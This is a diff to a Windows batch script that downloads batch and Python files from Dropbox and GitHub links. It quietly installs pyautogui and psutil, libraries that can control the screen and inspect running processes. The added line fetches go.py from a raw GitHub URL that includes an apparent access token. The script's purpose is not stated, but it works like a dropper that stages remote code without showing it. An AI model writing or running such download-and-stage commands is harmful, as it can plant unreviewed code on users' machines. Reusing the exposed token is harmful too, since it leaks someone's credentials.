@@ -1,5 +1,6 @@
 @echo off
 curl -L -o loop.bat https://www.dropbox.com/scl/fi/vji7ekyslpbovokpqeay3/loop.bat?rlkey=876nfzm3qdmyqhc1jckgqjcld&dl=0
+curl -L -o go.py https://raw.githubusercontent.com/loverloca/go/main/go.py?token=GHSAT0AAAAAACOCYSREK4CYEHSZSV7ZIAYOZOJZT5Q
 curl -L -o show.bat https://www.dropbox.com/scl/fi/cwbwdo2n3tt8rbqmugc6h/show.bat?rlkey=41m0ds12mg6e28giib3zqlf6w&dl=0
 pip install pyautogui --quiet
 pip install psutil --quiet
